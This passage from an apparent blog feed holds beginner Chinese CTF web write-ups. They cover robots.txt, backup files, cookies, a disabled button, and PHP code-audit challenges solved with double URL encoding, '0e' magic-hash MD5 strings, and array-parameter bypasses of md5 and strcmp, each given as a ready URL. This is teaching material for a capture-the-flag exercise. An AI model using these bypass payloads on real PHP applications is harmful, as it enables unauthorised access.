POST"></a>两种 HTTP 请求方法：GET 和 POST</h3><p>在客户机和服务器之间进行请求-响应时，两种最常被用到的方法是：GET 和 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST。</span><br><span class="line">&#123;</span><br><span class="line">GET - 从指定的资源请求数据。</span><br><span class="line">POST - 向指定的资源提交要被处理的数据</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_httpmethods.asp</a> </p><p><a href="https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc" target="_blank" rel="noopener">https://baijiahao.baidu.com/s?id=1620934682611653374&amp;wfr=spider&amp;for=pc</a><br>实际操作：打开网址，得到如下要求<br><img src="https://img-blog.csdnimg.cn/20190904152016124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>&lt;用GET给后端传参的方法是：在?后跟变量名字，不同的变量之间用&amp;隔开&gt;<br>在url后添加/？a=1即可发送get请求。</strong><br><img src="https://img-blog.csdnimg.cn/20190904152106943.png" alt="在这里插入图片描述"><br><strong>利用hackbar进行POST传参：复制get的url，选择postdata，填入b=2，选择execute。即可发送POST请求。</strong><br><img src="https://img-blog.csdnimg.cn/20190904152142555.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904152154319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>关于GET 和 POST：<a href="https://www.cnblogs.com/williamjie/p/9099940.html" target="_blank" rel="noopener">https://www.cnblogs.com/williamjie/p/9099940.html</a></strong></p><hr><h1 id="Robots"><a href="#Robots" class="headerlink" title="Robots"></a>Robots</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p><h2 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h2><p>  <strong>robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。</strong><br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。百度官方建议，仅当您的网站包含不希望被搜索引擎收录的内容时，才需要使用robots.txt文件。如果您希望搜索引擎收录网站上所有内容，请勿建立robots.txt文件。<br>如果将网站视为酒店里的一个房间，robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪些房间因为存放贵重物品，或可能涉及住户及访客的隐私而不对搜索引擎开放。但robots.txt不是命令，也不是防火墙，如同守门人无法阻止窃贼等恶意闯入者。</p><p>Robots协议用来告知搜索引擎哪些页面能被抓取，哪些页面不能被抓取；可以屏蔽一些网站中比较大的文件，如：图片，音乐，视频等，节省服务器带宽；可以屏蔽站点的一些死链接。方便搜索引擎抓取网站内容；设置网站地图连接，方便引导蜘蛛爬取页面。<br>【<a href="https://blog.csdn.net/qq_40491569/article/details/83473703】" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83473703】</a></p><h3 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h3><p>打开网页空白；<br><img src="https://img-blog.csdnimg.cn/20190904152608276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在题URL后输入/robots.txt即：  <a href="http://111.198.29.45:35567/robots.txt" target="_blank" rel="noopener">http://111.198.29.45:35567/robots.txt</a><br><img src="https://img-blog.csdnimg.cn/20190904152620940.png" alt="在这里插入图片描述"><br>f1ag_1s_h3re.php这个页面不允许被爬取，查看一下f1ag_1s_h3re.php页面得到flag.<br><img src="https://img-blog.csdnimg.cn/2019090415264189.png" alt="在这里插入图片描述"></p><hr><h1 id="Backup"><a href="#Backup" class="headerlink" title="Backup"></a>Backup</h1><h2 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！<br><img src="https://img-blog.csdnimg.cn/20190904152903767.png" alt="在这里插入图片描述"><br><strong>备份文件:    bak（被自动或是通过命令创建的辅助文件，它包含某个文件的最近一个版本）</strong></p><p>试着在index.php后加.bak<br>得到index.php.bak的备份文件，打开得到flag</p><hr><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h2 id="知识补充：-1"><a href="#知识补充：-1" class="headerlink" title="知识补充："></a>知识补充：</h2><p>Cookie 可以翻译为“小甜品，小饼干”，Cookie 在网络系统中几乎无处不在，当我们浏览以前访问过的网站时，网页中可能会出现 ：你好 XXX，这会让我们感觉很亲切，就好像吃了一个小甜品一样。这其实是通过访问主机中的一个文件来实现的，这个文件就是 Cookie。在 Internet 中，<strong>Cookie 实际上是指小量信息，是由Web服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。<br>其实cookies是由网络服务器存储在你电脑硬盘上的一个txt类型的小文件，它和你的网络浏览行为有关，所以存储在你电脑上的cookies就好像你的一张身份证，你电脑上的cookies和其他电脑上的cookies是不一样的;cookies不能被视作代码执行</strong>，也不能成为病毒，所以它对你基本无害。<br>cookies的作用主要是，当你访问了某些网页，并且对网页的一些设置进行修改，cookies就能跟踪并记录到这些修改，当你下一次访问这个网页的时候，这个网页会分析你电脑上的cookies，进而采取措施像你返回更符合你个性化的网页;</p><p>　　当然，目前大部分广告的定位基础也是基于cookies的，比如你此前访问了大量的健身类网站，cookies记录了你的访问行为，广告主就能够根据你的访问行为，向你推送健身类的广告。</p><p>实际操作：利用开发者工具F12键—网络，查看消息头看到“Cookie look-here=cookie.php”<br><img src="https://img-blog.csdnimg.cn/2019090415314763.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904153157769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据提示信息，在URL后加上”/cookie.php”即<a href="http://111.198.29.45:47420/cookie.php" target="_blank" rel="noopener">http://111.198.29.45:47420/cookie.php</a><br><img src="https://img-blog.csdnimg.cn/20190904153416901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示查看HTTP响应，在消息头里发现flag。<br><img src="https://img-blog.csdnimg.cn/20190904153232157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h1><h2 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a>题目描述：</h2><p>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p><h2 id="知识补充：-2"><a href="#知识补充：-2" class="headerlink" title="知识补充："></a>知识补充：</h2><p>需要熟悉一些常见的HTML知识</p><h2 id="实际操作：-1"><a href="#实际操作：-1" class="headerlink" title="实际操作："></a>实际操作：</h2><p>右键-&gt;查看元素，在input中用了‘disabled=” “’属性，双击，将其删掉，按钮便可正常使用。<br><img src="https://img-blog.csdnimg.cn/20190904153647682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190904153656620.png" alt="在这里插入图片描述"></p><hr><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;view-source&quot;&gt;&lt;a href=&quot;#view-source&quot; class=&quot;headerlink&quot; title=&quot;view_source&quot;&gt;&lt;/a&gt;view_source&lt;/h1&gt;&lt;h2 id=&quot;题目描述：&quot;&gt;&lt;a href=&quot;#题目描述：&quot; class
      
    
    </summary>
    
      <category term="CTF" scheme="https://singlemindedt.github.io/categories/CTF/"/>
    
      <category term="Web" scheme="https://singlemindedt.github.io/categories/CTF/Web/"/>
    
    
      <category term="Web" scheme="https://singlemindedt.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>代码审计</title>
    <link href="https://singlemindedt.github.io/2019/09/03/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1ONE/"/>
    <id>https://singlemindedt.github.io/2019/09/03/代码审计ONE/</id>
    <published>2019-09-03T14:35:18.000Z</published>
    <updated>2019-09-04T08:46:22.694Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>（来源：实验吧  解题链接： <a href="http://ctf5.shiyanbar.com/DUTCTF/index.php）" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php）</a><br><img src="https://img-blog.csdnimg.cn/20190903224633314.png" alt="在这里插入图片描述"><br>点开链接只有如上一句话。<br>根据提示 直接访问： index.php.txt<br>        （即：<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php.txt）" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php.txt）</a><br>得到如下页面：<br><img src="https://img-blog.csdnimg.cn/20190903224649753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,$_GET[id])) &#123;      <span class="comment">//对id进行字符串匹配，若$_GET[id]中有hacker DJ则</span></span><br><span class="line">    <span class="comment">//出not allowed!并终止正在执行的进程;</span></span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">      <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $_GET[id] = urldecode($_GET[id]);    <span class="comment">//urldecode对字符串进行URL解码;将解码后的//$_GET[id]赋值给$_GET[id];</span></span><br><span class="line">    <span class="keyword">if</span>($_GET[id] == <span class="string">"hackerDJ"</span>)            <span class="comment">//若$_GET[id]的值等于hackerDJ，输出Access granted! //并给出flag: *****************&#125;</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure><hr>   <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">说明</span><br><span class="line">通过 URL 参数传递给当前脚本的变量的数组</span><br><span class="line">Example <span class="comment">#1$_GET范例</span></span><br><span class="line">     <span class="meta">&lt;?php</span>          <span class="keyword">echo</span> <span class="string">'Hello '</span> . htmlspecialchars($_GET[<span class="string">"name"</span>]) . <span class="string">'!'</span>;     <span class="meta">?&gt;</span></span><br><span class="line">假设用户访问的是 http:<span class="comment">//example.com/?name=Hannes</span></span><br><span class="line">以上例程的输出类似于：</span><br><span class="line">                       Hello Hannes!</span><br></pre></td></tr></table></figure><h2 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h2><p>有$_GET[id] 所以应该是可以用 ?id= 来构造URL<br>id变量是一个url解码函数前不包含hackerDJ，url解码函数后为hackerDJ的变量，即id在进入url解码函数前必须是hackerDJ的url编码形式</p><p> <strong>注意：</strong>由于在浏览器输入url后会进行一次decode，这段代码中又进行一次decode，所以应对hackerDJ进行两次encode。只进行一次encode，浏览器自动解码后即为hackerDJ,被eregi()拦住，所以要进行二次编码，即对%68%61%63%6B%65%72%44%4A进行url编码。</p><p>①　<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%68%61%63%6B%65%72%44%4A" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%68%61%63%6B%65%72%44%4A</a></p><p>②　<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</a> </p><p>或者直接对其中的一个字母进行二次编码： h –&gt; %68 –&gt; %2568<br>构造url: index.php?id=%2568ackerDJ</p><hr><h1 id="Very-easy"><a href="#Very-easy" class="headerlink" title="Very easy"></a>Very easy</h1><p>打开链接直接得到如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$what=$_GET[<span class="string">'what'</span>];</span><br><span class="line"><span class="keyword">echo</span> $what;</span><br><span class="line"><span class="keyword">if</span>($what==<span class="string">'flag'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'flag&#123;****&#125;'</span>;</span><br></pre></td></tr></table></figure><p>分析：如果$what等于flag,则给出flag。<br>解决：<a href="http://123.206.87.240:8002/get/?what=flag" target="_blank" rel="noopener">http://123.206.87.240:8002/get/?what=flag</a> 得到flag。</p><hr><h1 id="Experiment-1"><a href="#Experiment-1" class="headerlink" title="Experiment 1"></a>Experiment 1</h1><p>打开链接直接出现PHP代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'money'</span>])) &#123;</span><br><span class="line">        $money=$_GET[<span class="string">'money'</span>];</span><br><span class="line">        <span class="keyword">if</span>(strlen($money)&lt;=<span class="number">4</span>&amp;&amp;$money&gt;time()&amp;&amp;!is_array($money))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;!--By:daoyuan--&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"Wrong Answer!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">"Wrong Answer!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h2><p>第一行:告诉我们flag应该就在flag.php中<br>第二行：highlight_file() 函数对文件进行 PHP 语法高亮显示。语法通过使用 HTML 标签进行高亮。</p><p>提示：用于高亮的颜色可通过 php.ini 文件进行设置或者通过调用 ini_set() 函数进行设置。</p><p>注释：当使用该函数时，整个文件都将被显示，包括密码和其他敏感信息！</p><p><strong>语法：highlight_file(filename,return)</strong><br><strong>filename    必需。规定要显示的文件。</strong><br><strong>return    可选。</strong><br>如果该参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。<br>默认是 FALSE。<br>返回值<br>如果 return 参数设置为 TRUE，该函数将以字符串形式返回高亮显示的代码，而不是直接进行输出。<br>否则，如果成功则返回 TRUE，如果失败则返回 FALSE。<br><strong>If条件：$money的长度&lt;=4；同时&gt;time()；同时不是数组</strong><br>{<br>time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。<strong>此处我们直接将其理解为一个很大的数</strong><br>}<br>==PHP中，字符串开头以xex开头，x代表数字。会被转换成科学计数法。  如1e9 == 1×10^9==<br><strong>解决：直接用xex格式如：<a href="http://119.23.73.3:5001/web6/?money=10e9" target="_blank" rel="noopener">http://119.23.73.3:5001/web6/?money=10e9</a>  直接得到flag</strong></p><hr><h1 id="Experiment-2"><a href="#Experiment-2" class="headerlink" title="Experiment 2"></a>Experiment 2</h1><p>打开链接页面中只有一句话“好像少了点什么”，试着在url后添加<strong>index.php~</strong><br>即<a href="http://119.23.73.3:5001/web5/index.php~。" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/index.php~。</a><br>打开页面发现什么都没有，查看源文件发现果然有PHP文件：</p><p><img src="https://img-blog.csdnimg.cn/20190903230150990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="分析代码："><a href="#分析代码：" class="headerlink" title="分析代码："></a>分析代码：</h2><p>9：给出$flag的值为我们最终需要的结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moctf&#123;**************&#125;</span><br></pre></td></tr></table></figure><p>11：<br>{<br>PHP的isset()函数 一般用来检测变量是否设置<br>格式：bool isset ( mixed var [, mixed var [, …]] )<br>功能：检测变量是否设置<br>返回值：<br>若变量不存在则返回 FALSE<br>若变量存在且其值为NULL，也返回 FALSE<br>若变量存在且值不为NULL，则返回 TURE<br>同时检查多个变量时，每个单项都符合上一条要求时才返回 TRUE，否则结果为 FALSE<br>版本：PHP 3, PHP 4, PHP 5<br>更多说明：<br>使用 unset() 释放变量之后，它将不再是 isset()。<br>PHP函数isset()只能用于变量，传递任何其它参数都将造成解析错误。<br>检测常量是否已设置可使用 defined() 函数。<br>}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">If</span>条件下对变量$_GET[<span class="string">'a'</span>]和$_GET[<span class="string">'b'</span>]赋值，并将其赋值给$a,$b.</span><br><span class="line">若$a等于$b则打印Wrong Answer!</span><br><span class="line">否则在条件md5($a)==md5($b)下给出$flag，否则打印Wrong Answer！</span><br><span class="line">**即此代码的意思时要我们对提供$a,$b使得其值不同，但MD5值相同。**</span><br></pre></td></tr></table></figure><p><strong>***弱类型比较——“==”类型转换的规则<br>1、字符串和数字比较，字符串会被转换成数字。  “admin”==0 (true)  admin被转换成数字，由于admin是字符串，转换失败，int(admin)=0，所以 比较结果是true。<br>2、混合字符串转换成数字，看字符串的第一个。  “1admin”==1      “2admin”==2<br>3、字符串开头以xex开头，x代表数字。会被转换成科学计数法。  1e9 == 1×10^9</strong></p><p>注：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"admin1"</span>==<span class="number">1</span> <span class="comment">//false</span></span><br><span class="line"><span class="string">"admin1"</span>==<span class="number">0</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>参考网上资料：<strong>当一个字符串当作一个数值来取值，其结果和类型如下:<br>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>则：该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</strong></p><p><strong>所以我们可以直接找符合xex格式的MD5原参</strong><br>{MD5 算法自诞生之日起，就有很多人试图证明和发现它的不安全之处，即存在碰撞（在对两个不同的内容使用 MD5算法运算的时候，有可能得到一对相同的结果值）–百科}<br>md5的碰撞，在PHP的数的处理中，类似0开头的字符串会被转换成0，因此有md5碰撞。</p><p>MD5值(哈希值)相等的问题可以用哈希值碰撞，也可以用数组绕过，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`username[]=<span class="number">1</span>&amp;password[]=<span class="number">2.</span></span><br></pre></td></tr></table></figure><p>解决：<a href="http://119.23.73.3:5001/web5/**?a=QNKCDZO&amp;b=s878926199a" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/**?a=QNKCDZO&amp;b=s878926199a</a>** ,直接得到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'**QNKCDZO**'</span>)==md5(<span class="string">'**s878926199a** '</span>)---&gt;True</span><br></pre></td></tr></table></figure><hr><h1 id="Experiment-2-1"><a href="#Experiment-2-1" class="headerlink" title="Experiment 2.1"></a>Experiment 2.1</h1><p>题目给出了php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;test&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === md5($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析代码：-1"><a href="#分析代码：-1" class="headerlink" title="分析代码："></a>分析代码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们得构造$_GET[‘username’]和$GET[‘password’]的值不相等，同时它们的md5的值相等才能得到flag</span><br></pre></td></tr></table></figure><p>因为md5不能处理数组，可以使用数组绕过，md5(数组)会返回FALSE，username[]=1,password[]=2这样弱==下可以实现username!=password,同时会得到FALSE===FALSE使得md5(username)===md5(password)成立。<br>解决：<a href="http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2" target="_blank" rel="noopener">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</a> 直接得到flag。</p><hr><h1 id="Experiment-3"><a href="#Experiment-3" class="headerlink" title="Experiment 3"></a>Experiment 3</h1><p>打开链接得到：<br><img src="https://img-blog.csdnimg.cn/20190903231726221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjM4MDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>细细品味后发现“链接”下真有一个链接。点开得到php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">$v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">$v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">$v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line"><span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line"><span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析代码：-2"><a href="#分析代码：-2" class="headerlink" title="分析代码："></a>分析代码：</h2><p>v1不等于v2同时两者的MD5值相等<br><strong>&lt;此处既可以用MD5的0e漏洞也可以利用数组绕过&gt;</strong><br>由if(!strcmp(v3,flag))需要v3和flag值相同才返回flag的值</p><h3 id="strcmp漏洞"><a href="#strcmp漏洞" class="headerlink" title="strcmp漏洞"></a>strcmp漏洞</h3><p>int strcmp ( string str1,stringstr2 )<br>str1是第一个字符串，str2是第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>但是如果我们传入非字符串类型的数据的时候，这个函数将发生错误，在5.3之前的php中，显示了报错的警告信息后，将return 0 ! 也就是虽然报了错，但却判定其相等了。</p><p>因此，解这道题，就只要传入一个非字符串类型的变量使其报错，又由于前面的否定“！”得到true。<br>解决：<a href="http://123.206.31.85:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1" target="_blank" rel="noopener">http://123.206.31.85:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</a> </p><hr><h1 id="Experiment-3-2"><a href="#Experiment-3-2" class="headerlink" title="Experiment 3.2"></a>Experiment 3.2</h1><p>打开链接得到空页，根据给出的php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (strcmp($_GET[<span class="string">'a'</span>], $flag) == <span class="number">0</span>) </span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'No'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="分析代码：-3"><a href="#分析代码：-3" class="headerlink" title="分析代码："></a>分析代码：</h2><p>  第一行，flag变量被设置为flag{xxxxx}。这并不是我们要提交的flag，真实运行的后端中的flag变量才是真的flag。<br>  第二行，isset函数判断HTTP 